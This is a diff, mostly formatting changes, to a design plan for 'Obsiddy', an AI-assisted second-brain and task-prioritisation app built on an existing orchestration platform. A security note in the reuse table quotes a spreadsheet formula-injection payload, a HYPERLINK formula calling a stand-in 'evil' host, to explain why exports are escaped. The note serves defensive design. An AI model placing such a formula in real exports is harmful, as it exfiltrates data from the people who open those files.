+| `obsiddy-weekly-review`     | `0 16 * * 5` | snapshot → `llm_call` (moved / stalled / at risk vs month+quarter goals) → `reflect` → review → notify                       |
+| `obsiddy-horizon-check`     | `0 9 1 * *`  | snapshot → `llm_call` → `judge_call` scoring each goal 0–1 on evidenced activity → `guard` flags < 0.3 → month review        |
+| `obsiddy-capture-intake`    | inbound      | `obsiddy_capture_for_token` → `agent_call obsiddy-triage` single-thought mode                                                |
 
 ### Morning briefing — the one on-demand workflow
 
@@ -288,19 +288,19 @@ Press a button, get: **what you've actually finished recently**, and **what's wo
 
 ### `workStyle` — and why it can't just be a tone setting
 
-`ObsiddySpace.workStyle` = `structured | balanced | exploratory` (default `balanced`), set in settings with a `<FieldHelp>` explaining it in plain terms — *"Do you want the morning briefing to lead with your task list, or with something you might not have thought of?"*
+`ObsiddySpace.workStyle` = `structured | balanced | exploratory` (default `balanced`), set in settings with a `<FieldHelp>` explaining it in plain terms — _"Do you want the morning briefing to lead with your task list, or with something you might not have thought of?"_
 
 The rule that makes this real: **`workStyle` changes what data the briefing selects, not just how it's worded.** A version that only adjusts tone is theatre — same content, different adjectives — and users notice within a week.
 
-| `workStyle` | Leads with | Data actually selected |
-| --- | --- | --- |
-| `structured` | The plan | Top 5 by `priorityScore`, anything overdue, today's time blocks, WIP-limit breaches, remaining weekly capacity |
+| `workStyle`   | Leads with     | Data actually selected                                                                                                                                                                                   |
+| ------------- | -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `structured`  | The plan       | Top 5 by `priorityScore`, anything overdue, today's time blocks, WIP-limit breaches, remaining weekly capacity                                                                                           |
 | `exploratory` | The unexpected | Highest-`strength` unreviewed `ObsiddyLink` suggestions, one resurfaced thought from >90 days ago, one `obsiddy_ideate` angle on an active project. Deadlines appear as a short footer, not the headline |
-| `balanced` | One of each | Top 3 tasks, then the single strongest unreviewed connection |
+| `balanced`    | One of each    | Top 3 tasks, then the single strongest unreviewed connection                                                                                                                                             |
 
 **Per-briefing override.** People aren't one type permanently — you're structured in a deadline week and exploratory on a quiet Friday. A "surprise me today" control regenerates against `exploratory` without changing the stored setting. Cheap, and it stops the config becoming a cage.
 
-**`workStyle` does not touch `score.ts`.** Ranking stays deterministic and shared (D3); `workStyle` governs presentation and selection only. An exploratory user who wants urgency to matter less should lower the `urgency` weight in `priorityWeights` — and the briefing can *suggest* that, via the same explicit-confirmation path as any other weight change (§10).
+**`workStyle` does not touch `score.ts`.** Ranking stays deterministic and shared (D3); `workStyle` governs presentation and selection only. An exploratory user who wants urgency to matter less should lower the `urgency` weight in `priorityWeights` — and the briefing can _suggest_ that, via the same explicit-confirmation path as any other weight change (§10).
 
 ### The briefing workflow
 
@@ -309,12 +309,12 @@ The rule that makes this real: **`workStyle` changes what data the briefing sele
 1. `tool_call obsiddy_get_snapshot`
 2. **`report`** — the factual half rendered deterministically, **no LLM**: completed counts and titles, overdue list, capacity remaining, WIP state (§7)
 3. **`route`** on `workStyle` → three branches
-4. `llm_call` per branch — different prompt *and* different input selection, per the table above
+4. `llm_call` per branch — different prompt _and_ different input selection, per the table above
 5. `tool_call obsiddy_write_review{ horizon: 'briefing' }`
 
 Seeded agent **`obsiddy-briefer`** (temp 0.3 structured / 0.7 exploratory via the branch), sharing the `obsiddy-core` profile. Its voice brief matters: short, concrete, no preamble, no motivational filler. Plain English, actions you could start in the next ten minutes.
 
-Routes: `GET /obsiddy/briefing` (today's, instant) and `POST /obsiddy/briefing/regenerate` (`{ workStyleOverride? }`). Capability `obsiddy_get_briefing` so it's reachable from chat and MCP — *"what's my briefing?"* from Claude Code is exactly the frictionless path §7 is chasing.
+Routes: `GET /obsiddy/briefing` (today's, instant) and `POST /obsiddy/briefing/regenerate` (`{ workStyleOverride? }`). Capability `obsiddy_get_briefing` so it's reachable from chat and MCP — _"what's my briefing?"_ from Claude Code is exactly the frictionless path §7 is chasing.
 
 Because `report` carries the factual half for free, the daily LLM cost is one small call — roughly **£0.30–0.90/month** depending on model.
 
@@ -340,9 +340,9 @@ The result: **"what should I work on today?" and "capture this thought" work fro
 
 Set `isIdempotent: true` on the read-only ones so the dispatcher's cache applies, and use `McpApiKey.scope` (a `Json` carrier documented as "a fork maps it to its own domain") if you later want per-board or per-entity key scoping.
 
-Expose **resources and prompts too, not just tools** — `McpExposedResource` supports URI *templates* (`listMcpResourceTemplates`) and `McpExposedPrompt` holds reusable prompt templates:
+Expose **resources and prompts too, not just tools** — `McpExposedResource` supports URI _templates_ (`listMcpResourceTemplates`) and `McpExposedPrompt` holds reusable prompt templates:
 
-- `obsiddy://today` — a resource Claude Code can *read* without spending a tool call
+- `obsiddy://today` — a resource Claude Code can _read_ without spending a tool call
 - `obsiddy://project/{slug}`, `obsiddy://entity/{slug}` — resource templates
 - A `weekly-review` MCP prompt, so the ritual is one command from anywhere
 
@@ -358,18 +358,18 @@ An iOS Shortcut posting to `/api/v1/obsiddy/capture` from the share sheet or a L
 
 ### Voice and image capture — the biggest thing the plan was missing
 
-A tool whose premise is *"records random thoughts during the day"* had no voice input. That's backwards: the moments you most need to capture — walking, driving, cooking — are exactly the ones where typing is impossible.
+A tool whose premise is _"records random thoughts during the day"_ had no voice input. That's backwards: the moments you most need to capture — walking, driving, cooking — are exactly the ones where typing is impossible.
 
 Everything needed already exists:
 
-| Piece | Where |
-| --- | --- |
-| Recording UI hook (MIME negotiation, 3-min cap, error states) | `lib/hooks/use-voice-recording.ts` — `useVoiceRecording()` |
-| Transcription | `LlmProvider.transcribe()` / `transcribeStream()` (`lib/orchestration/llm/openai-compatible.ts:349`), cost-logged like any other call |
-| Upload validation | `lib/validations/transcribe.ts` — `validateTranscribeUpload`, `enforceContentLengthCap` |
-| Agent toggle | `AiAgent.enableVoiceInput` (gated by `AiOrchestrationSettings.voiceInputGloballyEnabled`) |
-| Reference implementation | `app/api/v1/embed/speech-to-text/route.ts` |
-| Smoke test | `npm run smoke:transcribe` |
+| Piece                                                         | Where                                                                                                                                 |
+| ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
+| Recording UI hook (MIME negotiation, 3-min cap, error states) | `lib/hooks/use-voice-recording.ts` — `useVoiceRecording()`                                                                            |
+| Transcription                                                 | `LlmProvider.transcribe()` / `transcribeStream()` (`lib/orchestration/llm/openai-compatible.ts:349`), cost-logged like any other call |
+| Upload validation                                             | `lib/validations/transcribe.ts` — `validateTranscribeUpload`, `enforceContentLengthCap`                                               |
+| Agent toggle                                                  | `AiAgent.enableVoiceInput` (gated by `AiOrchestrationSettings.voiceInputGloballyEnabled`)                                             |
+| Reference implementation                                      | `app/api/v1/embed/speech-to-text/route.ts`                                                                                            |
+| Smoke test                                                    | `npm run smoke:transcribe`                                                                                                            |
 
 `POST /obsiddy/capture/voice` accepts an audio blob, transcribes it, and creates a `ObsiddyThought` with `source: 'voice'` — **keeping the transcript, not the audio**, so there's no new storage or retention surface. Wire the same hook into the brain chat by flipping `enableVoiceInput` on `obsiddy-companion`.
 
@@ -381,15 +381,15 @@ Together these make the phone a genuine capture device rather than a small keybo
 
 Each of these I had described writing from scratch. All exist:
 
-| Plan said | Use instead | Why it matters |
-| --- | --- | --- |
-| "CSV export with Trello-compatible headers" (§12) | **`csvEscape()`** — `lib/api/csv.ts` | **Security, not convenience.** The file's own comment warns about `HYPERLINK()` exfiltration: a task titled `=HYPERLINK("http://evil","Q4 plan")` becomes a *live formula* when the export opens in Excel or Sheets. Never `join(',')` user text |
-| "copy the bulk route's pre-parse content-length guard" (§4) | **`enforceContentLengthCap()`** — `lib/api/multipart-guard.ts` | It's already extracted; copying the route's inline version would fork it |
-| "Trello REST push" (§12, Release 4) | **`lib/orchestration/http/`** — `executeHttpRequest`, `isHostAllowed` (`ORCHESTRATION_ALLOWED_HOSTS`), `resolveIdempotencyHeader` | A hardened outbound kit with allowlisting and idempotency keys. Raw `fetch` re-introduces every SSRF and double-post problem this already solves |
-| "resolve snooze presets in `ObsiddySpace.timezone`" (§10) | **`lib/utils/timezones.ts`** | Plus `format-duration.ts` for `estimateMinutes`, `format-currency.ts` for cost display, `is-markdown.ts` for card notes |
-| Board / graph / list view switching (§9, §12) | **`use-tracked-url-tabs.ts`** | URL-synced tabs so a view is linkable and survives refresh |
-| Document upload UI (§4) | **`use-attachments.ts`** | Already handles the attach/preview/remove cycle |
-| "show the nightly run progress" | **`use-execution-live-poll.ts`**, `use-execution-status-poller.ts` | Built for exactly this |
+| Plan said                                                   | Use instead                                                                                                                       | Why it matters                                                                                                                                                                                                                                   |
+| ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| "CSV export with Trello-compatible headers" (§12)           | **`csvEscape()`** — `lib/api/csv.ts`                                                                                              | **Security, not convenience.** The file's own comment warns about `HYPERLINK()` exfiltration: a task titled `=HYPERLINK("http://evil","Q4 plan")` becomes a _live formula_ when the export opens in Excel or Sheets. Never `join(',')` user text |
+| "copy the bulk route's pre-parse content-length guard" (§4) | **`enforceContentLengthCap()`** — `lib/api/multipart-guard.ts`                                                                    | It's already extracted; copying the route's inline version would fork it                                                                                                                                                                         |
+| "Trello REST push" (§12, Release 4)                         | **`lib/orchestration/http/`** — `executeHttpRequest`, `isHostAllowed` (`ORCHESTRATION_ALLOWED_HOSTS`), `resolveIdempotencyHeader` | A hardened outbound kit with allowlisting and idempotency keys. Raw `fetch` re-introduces every SSRF and double-post problem this already solves                                                                                                 |
+| "resolve snooze presets in `ObsiddySpace.timezone`" (§10)   | **`lib/utils/timezones.ts`**                                                                                                      | Plus `format-duration.ts` for `estimateMinutes`, `format-currency.ts` for cost display, `is-markdown.ts` for card notes                                                                                                                          |
+| Board / graph / list view switching (§9, §12)               | **`use-tracked-url-tabs.ts`**                                                                                                     | URL-synced tabs so a view is linkable and survives refresh                                                                                                                                                                                       |
+| Document upload UI (§4)                                     | **`use-attachments.ts`**                                                                                                          | Already handles the attach/preview/remove cycle                                                                                                                                                                                                  |
+| "show the nightly run progress"                             | **`use-execution-live-poll.ts`**, `use-execution-status-poller.ts`                                                                | Built for exactly this                                                                                                                                                                                                                           |
 
 ### `logEvent()` vs `ObsiddyEvent` — why the plan keeps its own table
 
@@ -397,7 +397,7 @@ Each of these I had described writing from scratch. All exist:
 
 **`AiAdminAuditLog.userId` is `onDelete: SetNull`** (`orchestration-ops.prisma:89`). Rows survive user erasure as orphans carrying `entityId`s and `metadata` about a deleted person's content. `ObsiddyEvent` cascades via `ObsiddySpace` and is read on the weekly review's hot path, which a shared audit table indexed for admin queries is not.
 
-**Decision:** `ObsiddyEvent` for the activity stream. `logEvent()` for brain *ops* events that legitimately outlive the account — "share link created", "vault connected", "data exported" — and **never with personal content in `metadata`**. Recorded here because the seam exists and someone will otherwise ask why a table was added.
+**Decision:** `ObsiddyEvent` for the activity stream. `logEvent()` for brain _ops_ events that legitimately outlive the account — "share link created", "vault connected", "data exported" — and **never with personal content in `metadata`**. Recorded here because the seam exists and someone will otherwise ask why a table was added.
 
 ### Tenancy
 
@@ -447,26 +447,26 @@ Also seed a **judge agent** (`kind: 'judge'`): §6's `obsiddy-horizon-check` wor
 
 ### Recipes — the documented shape for every external integration
 
-`.context/orchestration/recipes/` ships nine worked integration recipes, and its index states the platform's position plainly: **no vendor SDKs are bundled**. Every integration is `call_external_api` + the orchestration HTTP module, configured per vendor. Recipes are *pattern*-named (`payment-charge.md`), never vendor-named, because "different forks pick different vendors for the same shape".
+`.context/orchestration/recipes/` ships nine worked integration recipes, and its index states the platform's position plainly: **no vendor SDKs are bundled**. Every integration is `call_external_api` + the orchestration HTTP module, configured per vendor. Recipes are _pattern_-named (`payment-charge.md`), never vendor-named, because "different forks pick different vendors for the same shape".
 
 This directly reshapes work already in the plan:
 
-| Plan item | Recipe |
-| --- | --- |
-| Trello push (§12, Release 4) | `call_external_api` + a `customConfig` binding + `ORCHESTRATION_ALLOWED_HOSTS` — **not bespoke Trello code**. Follow `recipes/index.md`'s 12-section template and write it as `.context/framework/obsiddy/recipes/board-export.md` |
-| Notification emails (§6) | `recipes/transactional-email.md` |
-| Time blocks / calendar (§1, `ObsiddyTimeBlock`) | **`recipes/calendar-event.md`** — two-way calendar sync was never scoped, and this is the documented path when you want it |
-| Review documents (§11) | `recipes/document-render.md` |
-| Approvals in chat (§7) | `recipes/in-chat-approval.md` |
-| SMS/WhatsApp capture (§7) | `recipes/sms-whatsapp-inbound-reply.md` |
+| Plan item                                       | Recipe                                                                                                                                                                                                                             |
+| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Trello push (§12, Release 4)                    | `call_external_api` + a `customConfig` binding + `ORCHESTRATION_ALLOWED_HOSTS` — **not bespoke Trello code**. Follow `recipes/index.md`'s 12-section template and write it as `.context/framework/obsiddy/recipes/board-export.md` |
+| Notification emails (§6)                        | `recipes/transactional-email.md`                                                                                                                                                                                                   |
+| Time blocks / calendar (§1, `ObsiddyTimeBlock`) | **`recipes/calendar-event.md`** — two-way calendar sync was never scoped, and this is the documented path when you want it                                                                                                         |
+| Review documents (§11)                          | `recipes/document-render.md`                                                                                                                                                                                                       |
+| Approvals in chat (§7)                          | `recipes/in-chat-approval.md`                                                                                                                                                                                                      |
+| SMS/WhatsApp capture (§7)                       | `recipes/sms-whatsapp-inbound-reply.md`                                                                                                                                                                                            |
 
-**This materially de-risks Release 4.** The recipe pattern puts credentials in **env vars, never in the DB** — so a single-org Obsiddy deployment pushing to one Trello workspace needs no `secret-box` at all. Per-*user* Trello tokens are the only case that genuinely requires encrypted per-user credential storage. Ship the env-var recipe first; treat per-user tokens as a separate, later decision rather than a prerequisite.
+**This materially de-risks Release 4.** The recipe pattern puts credentials in **env vars, never in the DB** — so a single-org Obsiddy deployment pushing to one Trello workspace needs no `secret-box` at all. Per-_user_ Trello tokens are the only case that genuinely requires encrypted per-user credential storage. Ship the env-var recipe first; treat per-user tokens as a separate, later decision rather than a prerequisite.
 
 ### Conventions the plan should follow explicitly
 
 Docs read in this pass that carry rules the plan hadn't stated:
 
-- **`.context/security/gotchas.md`** — eleven named traps. Four bite here: *#2 calling section limiters from route handlers* (CLAUDE.md says the same — `proxy.ts` already applied them; Obsiddy adds only per-flow sub-caps), *#11 fetching user-controlled URLs without an SSRF guard* (the git remote, §14), *#5 stack traces in production error responses*, and *#7 input sanitisation breaking legitimate input* — relevant because note bodies are markdown and over-eager sanitising will mangle them. Read it before writing the first route.
+- **`.context/security/gotchas.md`** — eleven named traps. Four bite here: _#2 calling section limiters from route handlers_ (CLAUDE.md says the same — `proxy.ts` already applied them; Obsiddy adds only per-flow sub-caps), _#11 fetching user-controlled URLs without an SSRF guard_ (the git remote, §14), _#5 stack traces in production error responses_, and _#7 input sanitisation breaking legitimate input_ — relevant because note bodies are markdown and over-eager sanitising will mangle them. Read it before writing the first route.
 - **`.context/types/conventions.md`** — shared types in `types/`, Zod schemas in `lib/validations/`, schema inference over hand-written interfaces. Obsiddy's types go in `types/obsiddy.ts` and its schemas in `lib/framework/obsiddy/validations.ts`, both inferred from Zod rather than declared twice.
 - **`.context/architecture/patterns.md`** — directory-by-responsibility, centralised error classes, the guard + thrown-error route shape. The plan matches this; worth citing so a reviewer can check.
 - **`.context/api/mobile-integration.md`** — a full mobile guide (auth, secure storage, session expiry, refresh, a type-safe client, iOS native). §8's Shortcuts and PWA work should follow it rather than reinvent the auth handshake.
@@ -476,7 +476,7 @@ Docs read in this pass that carry rules the plan hadn't stated:
 
 Sunrise ships 19 step types; §6's workflows use nine. Three of the unused ones directly improve what's already there:
 
-- **`report`** — deterministic Markdown from the execution trace via `renderExecutionMarkdown`, **with no LLM call**. The weekly review currently has an LLM render everything, including counts and lists that are pure data. Split it: `report` renders the factual half for free, `llm_call` writes only the judgement. A direct token saving on the most frequent workflow. (Note the documented subtlety: an in-step `report` only sees the trace *up to* that step.)
+- **`report`** — deterministic Markdown from the execution trace via `renderExecutionMarkdown`, **with no LLM call**. The weekly review currently has an LLM render everything, including counts and lists that are pure data. Split it: `report` renders the factual half for free, `llm_call` writes only the judgement. A direct token saving on the most frequent workflow. (Note the documented subtlety: an in-step `report` only sees the trace _up to_ that step.)
 - **`supervisor`** — a post-hoc judge audit of the whole trace, writing `supervisorVerdict` / `supervisorScore` / `supervisorReport` onto the execution row. Aim it at the weekly review and ask the question self-reported reviews always dodge: **was this honest about what didn't get done?** A review that only reports progress is worse than no review.
 - **`route`** — classify then branch. `obsiddy-nightly-triage` currently hands everything to one `agent_call`; routing on thought type (actionable / reference / idea / noise) is cheaper, more debuggable, and lets the noise branch cost nothing.
 
@@ -486,24 +486,24 @@ Also: **`lib/orchestration/review-schema/`** defines a declarative schema for re
 
 ### Smaller plug-ins, each a line or two
 
-| Surface | Use |
-| --- | --- |
-| `lib/app/admin-nav.ts` (`registerNavSection`) | A "Second Brain" admin section — agent health, cost, eval runs. The plan registered `protected-routes` but forgot this seam |
-| `lib/app/emails.ts` (`emailOverrides`) | Re-skin the share-invite and notification emails without forking the templates |
-| `lib/app/surface.ts` | `/obsiddy` classifies as `consumer`, so it picks up `brand-theme.css` automatically. Nothing to change — but know that's why it looks the way it does |
-| `cost-estimation/workflow-cost.ts` | Pre-run USD estimate on the connection-finder before it burns its `budgetLimitUsd` |
-| `human_approval` step | Gate bulk-destructive actions (mass archive, vault mirror-delete) through the existing approval queue rather than a bespoke confirm dialog |
-| `registerSchema` (`schemas/registry.ts`) | Named Zod schemas for structured workflow step outputs instead of ad-hoc parsing |
-| `registerOutboundAdapter` | SMS/WhatsApp capture, if email-to-inbox isn't enough |
-| Tracing (`registerTracer`) | No-op by default; the OTEL adapter exists if you ever need span trees across the nightly run |
-| Audit log | Obsiddy config changes land in `AiAuditLog` via the existing admin routes — free |
-| Experiments (A/B) | Two triage prompts, measured. Worth it once the eval dataset exists, not before |
-| `useWizard` + `useLocalStorage` | A first-run wizard: create your first area, goal and project. The setup-wizard pattern already exists to copy |
-| `lib/feature-flags/` + `FeatureFlag` | Gate the board, vault sync and sharing behind flags during rollout — toggle without a deploy |
-| `lib/analytics/` + `lib/consent/` | Product analytics (GA4 / Plausible / PostHog / console) already consent-gated. Distinct from orchestration analytics: this measures whether people *use* capture, that measures what the agents *said* |
-| `registerOutboundAdapter` + `AiOutboundMessage` | SMS / WhatsApp capture with a dedup ledger, if email-to-inbox isn't enough |
-| `DataErasureReceipt` | Erasure already produces receipts; the brain cleanup hook (§13) participates automatically |
-| `lib/monitoring/performance.ts` | Worth pointing at the board `/view` endpoint and `searchObsiddy`, the two hot paths |
+| Surface                                         | Use                                                                                                                                                                                                    |
+| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `lib/app/admin-nav.ts` (`registerNavSection`)   | A "Second Brain" admin section — agent health, cost, eval runs. The plan registered `protected-routes` but forgot this seam                                                                            |
+| `lib/app/emails.ts` (`emailOverrides`)          | Re-skin the share-invite and notification emails without forking the templates                                                                                                                         |
+| `lib/app/surface.ts`                            | `/obsiddy` classifies as `consumer`, so it picks up `brand-theme.css` automatically. Nothing to change — but know that's why it looks the way it does                                                  |
+| `cost-estimation/workflow-cost.ts`              | Pre-run USD estimate on the connection-finder before it burns its `budgetLimitUsd`                                                                                                                     |
+| `human_approval` step                           | Gate bulk-destructive actions (mass archive, vault mirror-delete) through the existing approval queue rather than a bespoke confirm dialog                                                             |
+| `registerSchema` (`schemas/registry.ts`)        | Named Zod schemas for structured workflow step outputs instead of ad-hoc parsing                                                                                                                       |
+| `registerOutboundAdapter`                       | SMS/WhatsApp capture, if email-to-inbox isn't enough                                                                                                                                                   |
+| Tracing (`registerTracer`)                      | No-op by default; the OTEL adapter exists if you ever need span trees across the nightly run                                                                                                           |
+| Audit log                                       | Obsiddy config changes land in `AiAuditLog` via the existing admin routes — free                                                                                                                       |
+| Experiments (A/B)                               | Two triage prompts, measured. Worth it once the eval dataset exists, not before                                                                                                                        |
+| `useWizard` + `useLocalStorage`                 | A first-run wizard: create your first area, goal and project. The setup-wizard pattern already exists to copy                                                                                          |
+| `lib/feature-flags/` + `FeatureFlag`            | Gate the board, vault sync and sharing behind flags during rollout — toggle without a deploy                                                                                                           |
+| `lib/analytics/` + `lib/consent/`               | Product analytics (GA4 / Plausible / PostHog / console) already consent-gated. Distinct from orchestration analytics: this measures whether people _use_ capture, that measures what the agents _said_ |
+| `registerOutboundAdapter` + `AiOutboundMessage` | SMS / WhatsApp capture with a dedup ledger, if email-to-inbox isn't enough                                                                                                                             |
+| `DataErasureReceipt`                            | Erasure already produces receipts; the brain cleanup hook (§13) participates automatically                                                                                                             |
+| `lib/monitoring/performance.ts`                 | Worth pointing at the board `/view` endpoint and `searchObsiddy`, the two hot paths                                                                                                                    |
 
 ### Deliberately not used
 
@@ -522,7 +522,7 @@ Also: **`lib/orchestration/review-schema/`** defines a declarative schema for re
 
 **Email-to-inbox** — Postmark adapter self-registers when `POSTMARK_INBOUND_USER`/`_PASS` are set. Address format `brain+<inboxToken>@<OBSIDDY_INBOX_DOMAIN>`; the adapter normalises `mailboxHash`.
 
-> **The one deliberate exception to "userId always from context".** `AiWorkflowTrigger` is `@@unique([channel, workflowId])` and stamps `execution.userId` from `trigger.createdBy`, so for genuine multi-user, `obsiddy_capture_for_token` takes `{ inboxToken, from, subject, text, messageId }`, resolves `userId` from `ObsiddySpace.inboxToken`, and **ignores `context.userId`**. Mandatory compensating controls: bound to *only* the intake agent; rejects unless `from` matches the resolved user's verified account email; `inboxToken` is 32 random chars and rotatable; `externalId` dedupes replays. Document loudly in `.context/framework/obsiddy/second-brain.md`.
+> **The one deliberate exception to "userId always from context".** `AiWorkflowTrigger` is `@@unique([channel, workflowId])` and stamps `execution.userId` from `trigger.createdBy`, so for genuine multi-user, `obsiddy_capture_for_token` takes `{ inboxToken, from, subject, text, messageId }`, resolves `userId` from `ObsiddySpace.inboxToken`, and **ignores `context.userId`**. Mandatory compensating controls: bound to _only_ the intake agent; rejects unless `from` matches the resolved user's verified account email; `inboxToken` is 32 random chars and rotatable; `externalId` dedupes replays. Document loudly in `.context/framework/obsiddy/second-brain.md`.
 
 **Voice capture** — `POST /obsiddy/capture/voice`, using `useVoiceRecording` + `LlmProvider.transcribe()` (§7). Stores the transcript with `source: 'voice'`, not the audio. **This should be the primary phone capture path**, with the text box as the fallback — the moments worth capturing are the ones where you can't type.
 
@@ -548,7 +548,7 @@ Two things that decide whether it feels good: **optimistic reordering** (move th
 
 ### Graph view
 
-**`@xyflow/react` v12 is already a dependency** (the workflow builder uses it), so nodes and edges render with no new library. What React Flow does *not* do is layout — it expects x/y coordinates. Add **`d3-force`** (~30 KB, does exactly this): run the simulation client-side in a `useEffect`, write the settled positions into React Flow nodes. Not `elkjs` — it's a multi-megabyte Java-transpiled bundle built for hierarchical diagrams, which is the wrong shape and the wrong weight.
+**`@xyflow/react` v12 is already a dependency** (the workflow builder uses it), so nodes and edges render with no new library. What React Flow does _not_ do is layout — it expects x/y coordinates. Add **`d3-force`** (~30 KB, does exactly this): run the simulation client-side in a `useEffect`, write the settled positions into React Flow nodes. Not `elkjs` — it's a multi-megabyte Java-transpiled bundle built for hierarchical diagrams, which is the wrong shape and the wrong weight.
 
 **Filtered by default, never "show everything."** Obsidian's graph view is the cautionary tale: above a few hundred nodes it becomes a hairball that looks impressive and tells you nothing. `/obsiddy/graph` opens focused on one node with `depth=1` and a node cap (~150), with controls to widen. A pretty hairball is a demo; a neighbourhood view is a tool.
 
@@ -581,21 +581,21 @@ score = clamp(base + activeManualBoost, -1, 2)
 - **goalAlignment** — walk task → project → goal via `projectId` and accepted `ObsiddyLink`s. Nearest horizon reached: week 1.0, month 0.8, quarter 0.6, year 0.45, life 0.35 (near horizons are more actionable). ×0.7 if the goal's target date has passed. Unlinked ⇒ 0.15.
 - **projectMomentum** — `exp(-daysSinceLastActivity/14)`. Stalled projects surface via `staleness` and the weekly review instead.
 - **areaBalance** — `clamp(1 - minutesThisWeekInArea / area.targetWeeklyMinutes, 0, 1)`. **This is the term that makes it a life organiser** — a neglected Health area floats above a hot work project.
-- **effortFit** — 1.0 when `estimateMinutes` fits today's largest free gap *and* `energy` matches the time-of-day profile; 0.5 otherwise.
+- **effortFit** — 1.0 when `estimateMinutes` fits today's largest free gap _and_ `energy` matches the time-of-day profile; 0.5 otherwise.
 - **staleness** — `min(1, daysSinceCreated/30)`, so nothing rots forever.
 
-Weights read from `ObsiddySpace.priorityWeights` (Zod-validated, above as defaults). The strategist may *propose* weight changes in a review; applying them goes through `PATCH /obsiddy/space` with explicit user confirmation — never a silent agent write.
+Weights read from `ObsiddySpace.priorityWeights` (Zod-validated, above as defaults). The strategist may _propose_ weight changes in a review; applying them goes through `PATCH /obsiddy/space` with explicit user confirmation — never a silent agent write.
 
 ### Manual override — `manualBoost`
 
-The six factors handle "what should generally matter". They cannot handle "I don't care what the maths says, *this* one first" — which is a real and frequent need, and without it the whole ranking loses credibility the first time it's wrong.
+The six factors handle "what should generally matter". They cannot handle "I don't care what the maths says, _this_ one first" — which is a real and frequent need, and without it the whole ranking loses credibility the first time it's wrong.
 
-- **`manualBoost Float @default(0)`**, clamped to `[-1, +1]`. **Applied additively *after* the weighted sum, never as a seventh weighted term.** A weighted term gets diluted by its own weight and can't guarantee anything; additive-after means `+1` provably outranks every unboosted task (base maxes at 1.0) and `-1` provably sinks below them. The guarantee is the whole point.
+- **`manualBoost Float @default(0)`**, clamped to `[-1, +1]`. **Applied additively _after_ the weighted sum, never as a seventh weighted term.** A weighted term gets diluted by its own weight and can't guarantee anything; additive-after means `+1` provably outranks every unboosted task (base maxes at 1.0) and `-1` provably sinks below them. The guarantee is the whole point.
 - **Negative boost is equally useful** — "bury this, I can't delete it but I don't want to see it". Cheap, and it stops the list filling with undeletable noise.
 - **`manualBoostExpiresAt DateTime?`, defaulting to +7 days.** This is the field that keeps the feature honest: a pin set in March and forgotten silently corrupts your ranking forever, and you'd never know the maths had stopped being followed. An expired boost is treated as `0` **at read time by the pure function** — never lazily zeroed by a background job, so behaviour can't depend on whether the nightly run happened. "Never expires" is allowed but requires an explicit checkbox, same principle as share links.
-- **`manualBoostReason String?`** — optional one-liner, shown in the UI and included in `priorityFactors` so both you and the agent can see *why* the ranking was overridden rather than treating it as an unexplained anomaly.
+- **`manualBoostReason String?`** — optional one-liner, shown in the UI and included in `priorityFactors` so both you and the agent can see _why_ the ranking was overridden rather than treating it as an unexplained anomaly.
 - **`deferUntil` still short-circuits to zero first.** Deferring is you saying "not before date X"; a boost must not resurrect it early. Order is: defer check → base → boost.
-- **No agent may write it.** No capability exposes it, and `obsiddy_reprioritise` never touches it. This is a human veto over the machine's opinion, so the machine writing it would defeat the purpose. It moves only via `PATCH /api/v1/obsiddy/tasks/[id]`. The agent may *read* it (it's in `priorityFactors`) and may *suggest* one in a review, as prose.
+- **No agent may write it.** No capability exposes it, and `obsiddy_reprioritise` never touches it. This is a human veto over the machine's opinion, so the machine writing it would defeat the purpose. It moves only via `PATCH /api/v1/obsiddy/tasks/[id]`. The agent may _read_ it (it's in `priorityFactors`) and may _suggest_ one in a review, as prose.
 - **`priorityFactors` records `base`, `manualBoost` and `boostActive`** separately, so the UI can render "ranked #1 — pinned by you, expires Friday" rather than an inexplicable number.
 
 UI: a pin control on each task row with a duration picker (today / this week / until I unpin), and a filter chip on `/obsiddy/today` to show what's currently pinned. The weekly review lists boosts expiring in the next 7 days.
@@ -604,14 +604,14 @@ UI: a pin control on each task row with a duration picker (today / this week / u
 
 `manualBoost` says "this, now". Snooze says "not this, not now". They're the same control from opposite ends and must feel like one idea.
 
-**The mechanism already exists for tasks: `deferUntil` hard-zeroes urgency and short-circuits the score.** What's missing is the *gesture* and the *learning*, plus the same capability on the three other things that clutter a view.
+**The mechanism already exists for tasks: `deferUntil` hard-zeroes urgency and short-circuits the score.** What's missing is the _gesture_ and the _learning_, plus the same capability on the three other things that clutter a view.
 
-| Surface | Field | Effect while snoozed |
-| --- | --- | --- |
-| Task | `deferUntil` (existing) | score short-circuits to 0; hidden from `/today` and default task lists |
-| Thought | `snoozedUntil` | drops out of the inbox count and the nightly triage queue |
-| Suggested link | `snoozedUntil` on `ObsiddyLink` | hidden from the connections view; the sweep won't re-propose it |
-| Project | `snoozedUntil` | hidden from the active projects list; `projectMomentum` decay pauses |
+| Surface        | Field                           | Effect while snoozed                                                   |
+| -------------- | ------------------------------- | ---------------------------------------------------------------------- |
+| Task           | `deferUntil` (existing)         | score short-circuits to 0; hidden from `/today` and default task lists |
+| Thought        | `snoozedUntil`                  | drops out of the inbox count and the nightly triage queue              |
+| Suggested link | `snoozedUntil` on `ObsiddyLink` | hidden from the connections view; the sweep won't re-propose it        |
+| Project        | `snoozedUntil`                  | hidden from the active projects list; `projectMomentum` decay pauses   |
 
 Presets, not a date picker first: **later today (+4h) · tomorrow (9am local) · next week (Mon 9am) · next month · pick a date**. All resolved in `ObsiddySpace.timezone`, never server time — a task that unsnoozes at 2am because the server is in UTC is the kind of small wrongness that makes a tool feel careless.
 
@@ -633,27 +633,27 @@ A normal to-do app lets you snooze the same item forty times and never mentions 
 
 ## 11. Lifecycle — archive, prune and obsolescence
 
-A second brain that only ever accumulates becomes unusable in about eighteen months: search gets noisier, the connection sweep spends its budget on dead projects, and the ranked list fills with things you stopped caring about in 2024. This needs designing now, because the retention windows have to be *fields* from the first migration or you'll be backfilling them later against real data.
